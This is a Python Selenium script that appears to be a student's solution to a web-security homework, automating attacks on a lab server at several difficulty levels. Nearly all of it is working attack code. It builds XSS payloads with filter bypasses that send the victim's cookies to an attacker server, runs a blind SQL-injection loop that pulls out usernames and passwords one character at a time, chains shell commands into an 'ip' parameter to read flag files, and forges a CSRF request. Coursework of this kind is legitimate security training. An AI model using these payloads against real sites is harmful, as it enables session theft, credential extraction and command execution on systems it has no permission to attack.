from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from bs4 import BeautifulSoup
import base64
import grader
import argparse

# NOTE: If you choose to run the servers on different ports for testing, please remember to set it back before submission.
TARGET_SERVER_ENDPOINT = 'http://localhost:1337'
# TARGET_SERVER_ENDPOINT = 'http://35.225.46.109:80'

# NOTE: where you need to update your static IP address of your server
ATTACKER_SERVER_ENDPOINT = 'http://localhost:1338'


# ATTACKER_SERVER_ENDPOINT = 'http://your static IP address:80'

def xss(vuln_type, level):
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)  # Starts the browser

    # driver.get(TARGET_SERVER_ENDPOINT)  # Makes a request to the specified URL.

    # DO SOMETHING

    if vuln_type == '1':
        if level == 'low':
            comment = '%3Cscript%3Ewindow.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F1%3Fcookie%3D%22%20%2B%20document.cookie%29%3C%2Fscript%3E'
        elif level == 'medium':
            comment = '%3Cscri%3Cscript%3Ept%3Ewindow.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F1%3Fcookie%3D%22%20%2B%20document.cookie%29%3C%2Fscript%3E'
        else:
            comment = '%3Cbody%20onload%3D%27document.location%3D%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F1%3Fcookie%3D%22%20%2B%20document.cookie%27%3E'
        url = '/'.join([TARGET_SERVER_ENDPOINT, 'xss', vuln_type, level]) + '?comment=' + comment

    elif vuln_type == '2':
        if level == 'low':
            comment = '%3Cscript%3Ewindow.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F2%3Fcookie%3D%22%20%2B%20document.cookie%29%3C%2Fscript%3E'
        elif level == 'medium':
            comment = '%3Cscri%3Cscript%3Ept%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F2%3Fcookie%3D%22%20%2B%20document.cookie)%3C%2Fscri%3C%2Fscript%3Ept%3E'
        else:
            comment = '%3CIMG%20SRC%3D%22javascript%3Awindow.open(%26apos%3Bhttp%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F2%3Fcookie%3D%26apos%3B%20%2B%20document.cookie)%3B%22%3E'
        url = '/'.join([TARGET_SERVER_ENDPOINT, 'xss', vuln_type, level]) + '?comment=' + comment
    else:
        if level == 'low':
            lang = '%3Cscript%3Ewindow.open(%22http://127.0.0.1:1338/xss/3?cookie=%22%20+%20document.cookie)%3C/script%3E'
        elif level == 'medium':
            lang = '%3Cbody%20onload=%27document.location=%22http://127.0.0.1:1338/xss/3?cookie=%22%20+%20document.cookie%27%3E'
        else:
            lang = 'en;%3Cbody%20onload=%27document.location=%22http://127.0.0.1:1338/xss/3?cookie=%22%20+%20document.cookie%27%3E'
        url = '/'.join([TARGET_SERVER_ENDPOINT, 'xss', vuln_type, level]) + '?lang=' + lang


    driver.get(url)

    # Grader verification should be done in attacker_server/server.py

    driver.quit()  # Closes the browser


def sql():
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    # soup = BeautifulSoup(driver.page_source)  # Get the page contents and use for parsing.
    # tr_elements = soup.find_all('tr') # Refer to the BeautifulSoup documentation for more details.

    # TODO: Populate the user_pass_list
    user_pass_list = []  # Where this should be a list of lists for containing the users and passwords
    # eg. [['username', 'password']]
    special_characters = ['%', '_', '#', '?']

    for i in range(1, 4):
        username = None
        pwd = ''
        more_char = True
        while more_char:
            more_char = False
            for j in range(32, 127):
                char = chr(j) if chr(j) not in special_characters else '[{}]'.format(chr(j))
                pwd_n = pwd + char
                url = 'http://35.225.46.109/sql_injection/low/id/{}%27%20and%20password%20like%20%27{}%25%27%3B--' \
                    .format(i, pwd_n)
                driver.get(url)
                soup = BeautifulSoup(driver.page_source, features='html.parser')
                tr_elements = soup.find_all('tr')
                if len(tr_elements) == 2:
                    pwd = pwd_n
                    if username is None:
                        username = tr_elements[1].find_all('td')[1].contents[0]
                    more_char = True
                    break
        user_pass_list.append({username: pwd})

    grader.sql_verify('low', user_pass_list)

    driver.quit()


def command_injection(level):
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    # NOTE: Remember to decode the flag before sending it to the grader.
    # grader.command_injection_verify(level, flag)
    if level == 'low':
        url = 'http://35.225.46.109/command_injection/low?ip=0.0.0.0;cd%20server/flags/command_injection;cat%20low.txt'
    elif level == 'medium':
        url = 'http://35.225.46.109/command_injection/medium?ip=0.0.0.0%26%3B%26cd%20server/flags/command_injection' \
              '%26%3B%26cat%20medium.txt '
    else:
        url = 'http://35.225.46.109/command_injection/high?ip=0.0.0.0%26%26cd%20server/flags/command_injection%26' \
              '%26cat%20high.txt '

    driver.get(url)
    element = driver.find_element_by_id('output')
    text = element.text
    secret = text.split('\n')[-1]
    flag = base64.b64decode(secret)
    grader.command_injection_verify(level, flag)

    driver.quit()


def csrf(level):
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)
    secret_msg = 'secretmessagelol'
    if level == 'low':
        query = '%3Cscript%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A1338%2Fcsrf_target%2Flow%2Fsecretmessagelol%22)%3B%3C%2Fscript%3E'
    else:
        query = '%3Cscript%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A1338%2Fcsrf_target%2Fmedium%2Fsecretmessagelol%22)%3B%3C%2Fscript%3E'

    url = TARGET_SERVER_ENDPOINT + '/' + 'csrf_src' + '?query=' + query

    driver.get(url)

    # get comments
    url = TARGET_SERVER_ENDPOINT + '/' + 'csrf_target'
    driver.get(url)
    soup = BeautifulSoup(driver.page_source, features='html.parser')
    tr_elements = soup.find_all('tr')
    tr_elements.pop(0)
    comments = []
    for tr in tr_elements:
        comments.append(tr.find_all('td')[1].contents[0])

    grader.csrf_verify(level, secret_msg, comments) # where secret_msg is the expected comment in the database from your attack.

    driver.quit()


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Clients for different tasks in HW2.')
    parser.add_argument('q', metavar='N', type=str,
                        help='has to be one of [command_injection, sql_injection, xss, csrf]')
    parser.add_argument('--level', type=str, default="all",
                        help='the level for each question')

    args = parser.parse_args()

    # NOTE: Feel free to modify the code here for your own purposes.
    # The code below can be used as an example.

    if args.q == "command_injection":
        assert args.level in ['all', 'low', 'medium', 'high']
        if args.level == "all":
            levels = ['low', 'medium', 'high']
        else:
            levels = [args.level]
        for level in levels:
            command_injection(level)
        exit()

    if args.q == "sql":
        assert args.level in ['all', 'low']
        if args.level == "all":
            levels = ['low']
        else:
            levels = [args.level]
        for level in levels:
            sql()
        exit()

    if args.q == "xss":
        methods = {"1": "reflected", "2": "stored", "3": "DOM"}
        for vuln_type in ['1', '2', '3']:
            print("XSS with method", methods[vuln_type])
            if args.level == "all":
                levels = ['low', 'medium', 'high']
            else:
                levels = [args.level]
            for level in levels:
                xss(vuln_type, level)
        exit()

    if args.q == "csrf":
        if args.level == "all":
            levels = ['low', 'medium']
        else:
            levels = [args.level]
        for level in levels:
            csrf(level)
        exit()
